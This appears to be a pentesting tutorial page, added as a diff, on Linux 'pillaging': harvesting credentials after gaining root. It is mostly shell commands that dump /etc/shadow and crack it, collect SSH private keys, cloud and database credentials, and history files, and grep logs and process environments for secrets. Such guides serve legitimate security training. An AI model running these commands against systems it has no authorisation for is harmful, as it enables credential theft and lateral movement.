@@ -1,0 +1,416 @@
+# Linux Pillaging
+
+> Pillaging is the art of extracting everything of value from a system you control. With elevated privileges, every config file, every log, every credential store is now readable. Know where to look.
+
+---
+
+## The Mindset
+
+Pillaging is post-exploitation with high privileges. The goal is to extract:
+
+- **Credentials** — passwords, hashes, keys, tokens
+- **Sensitive data** — PII, internal documents, business data
+- **Infrastructure intel** — internal hostnames, IPs, configs that help you move laterally
+- **Persistence material** — SSH keys, API tokens, service accounts
+
+The difference between enumeration and pillaging is **access level**. During enumeration you work with what a low-privilege user can see. During pillaging, you have root — every door is open.
+
+---
+
+## Operating System & Environment
+
+Start by confirming full context with elevated access:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Full system info
+uname -a
+cat /etc/os-release
+cat /proc/version
+
+# Environment — look for tokens, API keys, secrets
+env
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n'   # init process environment
+
+# Installed packages — find software with known CVEs
+dpkg -l                          # Debian/Ubuntu
+rpm -qa                          # RHEL/CentOS
+apt list --installed 2>/dev/null
+```
+
+---
+
+## Credentials in Configuration Files
+
+Configuration files are the richest source of credentials on any Linux system. Services need to authenticate to databases, APIs, and other services — those credentials live in config files.
+
+### Web Application Configs
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# WordPress — database credentials
+cat /var/www/html/wp-config.php
+find / -name "wp-config.php" 2>/dev/null | xargs cat
+
+# Generic PHP configs
+find /var/www -name "config.php" -o -name "configuration.php" -o -name "settings.php" 2>/dev/null | xargs cat
+
+# Laravel .env — database, API keys, app secrets
+find /var/www -name ".env" 2>/dev/null | xargs cat
+
+# Django settings
+find / -name "settings.py" 2>/dev/null | xargs grep -E "PASSWORD|SECRET|DATABASE" 2>/dev/null
+
+# Generic credential hunting in web dirs
+grep -rE "password|passwd|db_pass|secret|api_key|token" /var/www/ 2>/dev/null | grep -v ".svn\|.git\|Binary"
+```
+
+### Database Configuration Files
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# MySQL / MariaDB
+cat /etc/mysql/mysql.conf.d/mysqld.cnf
+cat /etc/mysql/my.cnf
+cat ~/.my.cnf                    # Per-user MySQL credentials (often has root password)
+
+# PostgreSQL
+cat /etc/postgresql/*/main/postgresql.conf
+cat /etc/postgresql/*/main/pg_hba.conf   # Auth config — may show trust auth
+find / -name "pgpass" -o -name ".pgpass" 2>/dev/null | xargs cat
+
+# MongoDB
+cat /etc/mongod.conf
+
+# Redis
+cat /etc/redis/redis.conf | grep -E "requirepass|bind"
+```
+
+### Service & Application Configs
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# SSH server config
+cat /etc/ssh/sshd_config
+
+# FTP
+cat /etc/vsftpd.conf
+cat /etc/proftpd/proftpd.conf
+
+# Apache / Nginx — virtual hosts may reveal app paths
+cat /etc/apache2/apache2.conf
+ls /etc/apache2/sites-enabled/
+cat /etc/nginx/nginx.conf
+ls /etc/nginx/sites-enabled/
+
+# Samba — may contain credentials
+cat /etc/samba/smb.conf
+
+# SNMP — community strings
+cat /etc/snmp/snmpd.conf
+
+# Any config file mentioning password under /etc
+grep -rE "password|passwd|secret" /etc/ 2>/dev/null | grep -v "^Binary\|:#"
+```
+
+---
+
+## SSH Keys
+
+SSH keys are the ultimate lateral movement credential — no cracking needed, works immediately.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Private keys for all users
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_dsa" 2>/dev/null
+
+# All .ssh directories
+find / -name ".ssh" -type d 2>/dev/null | xargs ls -la
+
+# Root's SSH keys
+ls -la /root/.ssh/
+cat /root/.ssh/id_rsa 2>/dev/null
+cat /root/.ssh/authorized_keys 2>/dev/null
+
+# All users' authorized keys (shows who can log in as whom)
+find /home /root -name "authorized_keys" 2>/dev/null | xargs cat
+
+# Known hosts (reveals other machines this box connects to)
+find /home /root -name "known_hosts" 2>/dev/null | xargs cat
+```
+
+<Tip>
+  `known_hosts` reveals every host this machine has ever SSH'd into. Each entry
+  is a lateral movement target. Even if the keys are hashed, the IPs/hostnames
+  are often visible.
+</Tip>
+
+---
+
+## Password & Hash Files
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# The classic pair — always try to read shadow
+cat /etc/passwd
+cat /etc/shadow
+
+# Unshadow and crack
+unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
+hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
+
+# NIS/YP shadow (older systems)
+cat /etc/passwd- 2>/dev/null
+cat /etc/shadow- 2>/dev/null
+
+# Cached sudo credentials
+ls -la /var/db/sudo/ 2>/dev/null
+```
+
+---
+
+## Command History Files
+
+Users type passwords directly into terminals constantly. History files capture everything.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Current user
+cat ~/.bash_history
+cat ~/.zsh_history 2>/dev/null
+cat ~/.sh_history 2>/dev/null
+cat ~/.fish_history 2>/dev/null
+
+# All users (with root access)
+find /home /root -name ".*history" 2>/dev/null | xargs cat
+
+# MySQL commands typed in terminal (passwords passed with -p)
+grep -h "mysql\|mysqladmin\|psql\|redis-cli\|mongo" /home/*/.bash_history /root/.bash_history 2>/dev/null
+
+# SSH commands (reveals targets and usernames)
+grep "ssh " /home/*/.bash_history /root/.bash_history 2>/dev/null
+
+# wget/curl with credentials in URLs
+grep -h "wget\|curl" /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -E "://.*:.*@"
+```
+
+---
+
+## Log Files
+
+Logs are a goldmine — applications log errors that often include credentials, and auth logs show activity patterns.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Authentication events — successful and failed logins
+cat /var/log/auth.log
+grep "Accepted\|Failed\|password" /var/log/auth.log | tail -50
+
+# System log — service starts, errors, cron activity
+cat /var/log/syslog | tail -100
+
+# Kernel log
+cat /var/log/kern.log | tail -50
+
+# Web server logs — URLs sometimes contain credentials
+cat /var/log/apache2/access.log | grep -E "password|passwd|token|key"
+cat /var/log/nginx/access.log | grep -E "password|passwd|token|key"
+
+# Application-specific logs
+ls /var/log/
+find /var/log -name "*.log" -readable 2>/dev/null | xargs grep -l "password\|credential\|token" 2>/dev/null
+```
+
+**Log locations reference:**
+
+| Log File                      | Contains                                      |
+| ----------------------------- | --------------------------------------------- |
+| `/var/log/auth.log`           | SSH logins, sudo usage, PAM events            |
+| `/var/log/syslog`             | General system events                         |
+| `/var/log/kern.log`           | Kernel messages                               |
+| `/var/log/apache2/access.log` | Web requests                                  |
+| `/var/log/apache2/error.log`  | App errors — often includes paths and configs |
+| `/var/log/mysql/error.log`    | Database errors                               |
+| `/var/log/mail.log`           | Mail server activity                          |
+| `/var/log/fail2ban.log`       | Blocked IPs — reveals attack patterns         |
+| `/var/log/journal/`           | Systemd journal (use `journalctl`)            |
+
+---
+
+## Databases
+
+If a database service is running, connect to it directly with root or the credentials you found.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# MySQL / MariaDB
+mysql -u root -p                           # prompted password
+mysql -u root -p'foundpassword'            # inline password
+mysql -u root --password=foundpassword -e "show databases;"
+
+# Once in MySQL:
+# SHOW DATABASES;
+# USE <database>;
+# SHOW TABLES;
+# SELECT * FROM users;
+# SELECT user, password FROM mysql.user;   ← MySQL user hashes
+
+# PostgreSQL
+psql -U postgres
+psql -U postgres -c "\l"                   # list databases
+psql -U postgres -d mydb -c "SELECT * FROM users;"
+
+# SQLite (common in apps)
+find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
+sqlite3 /path/to/database.db ".tables"
+sqlite3 /path/to/database.db "SELECT * FROM users;"
+
+# Redis (often unauthenticated)
+redis-cli
+redis-cli KEYS "*"
+redis-cli GET "<key>"
+```
+
+---
+
+## Stored Credentials & Secret Files
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# .netrc — FTP/HTTP credentials stored in plaintext
+find /home /root -name ".netrc" 2>/dev/null | xargs cat
+
+# AWS credentials
+find / -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat
+find / -name "config" -path "*/.aws/*" 2>/dev/null | xargs cat
+env | grep -E "AWS_|AMAZON_"
+
+# GCP credentials
+find / -name "*.json" -path "*/gcloud/*" 2>/dev/null
+
+# Docker — registry credentials and configs
+cat /root/.docker/config.json 2>/dev/null
+cat ~/.docker/config.json 2>/dev/null
+
+# Git config — may contain tokens or credentials in remote URLs
+find / -name ".gitconfig" 2>/dev/null | xargs cat
+find / -name ".git" -type d 2>/dev/null | xargs -I{} cat {}/../.git/config
+
+# Password manager databases
+find / -name "*.kdbx" -o -name "pass.gpg" 2>/dev/null
+
+# Any file literally named with sensitive keywords
+find / -type f \( -name "*password*" -o -name "*credential*" -o -name "*secret*" -o -name "*token*" \) 2>/dev/null | grep -v "^/proc\|^/sys"
+```
+
+---
+
+## Emails & Mail Spools
+
+Internal emails often contain credentials, reset links, and infrastructure information.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Local mail spools
+ls /var/mail/
+cat /var/mail/root 2>/dev/null
+find /var/mail /var/spool/mail -type f 2>/dev/null | xargs cat
+
+# Mutt / other mail client configs
+find /home /root -name ".muttrc" -o -name ".mailrc" 2>/dev/null | xargs cat
+```
+
+---
+
+## Interesting Files Across the System
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Backup files (often contain old configs with credentials)
+find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" 2>/dev/null
+
+# Scripts — may hardcode credentials or reveal logic
+find / -name "*.sh" -not -path "/usr/*" 2>/dev/null | head -20
+find / -name "*.py" -not -path "/usr/*" 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null
+
+# Recently modified files (last 10 minutes — post-exploitation activity)
+find / -type f -mmin -10 2>/dev/null | grep -v "^/proc\|^/sys"
+
+# Large files (potential data dumps)
+find / -type f -size +10M -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
+
+# Hidden files and directories
+find /home /root /tmp /var /opt -name ".*" -type f 2>/dev/null
+```
+
+---
+
+## Memory & Running Process Secrets
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Environment variables of running processes (may contain tokens/passwords)
+for pid in /proc/[0-9]*/environ; do
+    echo "=== $pid ==="
+    cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -E "PASS|SECRET|KEY|TOKEN|API"
+done
+
+# Command line arguments of all processes
+ps auxww | grep -E "password|passwd|secret|token|key" | grep -v grep
+
+# Dump strings from process memory (requires root)
+# Be careful — can destabilize processes
+cat /proc/<PID>/maps
+strings /proc/<PID>/mem 2>/dev/null | grep -E "password|secret"
+```
+
+---
+
+## Pillaging Checklist
+
+Run through this systematically after gaining elevated access:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# CREDENTIALS IN CONFIGS
+grep -rE "password|passwd|secret|api_key" /etc/ /var/www/ /opt/ 2>/dev/null | grep -v "^Binary\|#"
+
+# SHADOW FILE
+cat /etc/shadow
+
+# SSH KEYS
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
+
+# HISTORY FILES
+find /home /root -name ".*history" 2>/dev/null | xargs cat
+
+# WEB APP CONFIGS
+find /var/www -name "*.php" -o -name ".env" -o -name "config.*" 2>/dev/null | xargs grep -l "pass\|secret" 2>/dev/null
+
+# DATABASE CREDENTIALS
+cat ~/.my.cnf 2>/dev/null
+find / -name ".pgpass" 2>/dev/null | xargs cat
+
+# AWS / CLOUD CREDENTIALS
+find / -path "*/.aws/credentials" 2>/dev/null | xargs cat
+
+# INTERESTING FILES BY NAME
+find / -type f \( -name "*password*" -o -name "*secret*" -o -name "*credential*" \) 2>/dev/null | grep -v "^/proc\|^/sys"
+
+# MAIL SPOOLS
+ls /var/mail/ && cat /var/mail/root 2>/dev/null
+
+# BACKUP FILES
+find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
+
+# PROCESS ENVIRONMENT VARIABLES
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -E "PASS|SECRET|KEY|TOKEN"
+```
+
+---
+
+## Quick Reference
+
+| Target             | Command                                                           |
+| ------------------ | ----------------------------------------------------------------- |
+| Password hashes    | `cat /etc/shadow`                                                 |
+| Web app DB creds   | `find /var/www -name ".env" -o -name "wp-config.php" 2>/dev/null` |
+| MySQL stored creds | `cat ~/.my.cnf`                                                   |
+| SSH private keys   | `find / -name "id_rsa" 2>/dev/null`                               |
+| Known SSH targets  | `find / -name "known_hosts" 2>/dev/null \| xargs cat`             |
+| Command history    | `find /home /root -name ".*history" 2>/dev/null \| xargs cat`     |
+| AWS credentials    | `find / -path "*/.aws/credentials" 2>/dev/null \| xargs cat`      |
+| Auth logs          | `cat /var/log/auth.log`                                           |
+| Backup files       | `find / -name "*.bak" -o -name "*.old" 2>/dev/null`               |
+| Process secrets    | `cat /proc/1/environ 2>/dev/null \| tr '\0' '\n'`                 |
+
+---
+
+_Next: [System Logs](/tech/linux/system-logs) — reading and analyzing logs to understand what happened on a system and find evidence of credentials and activity._
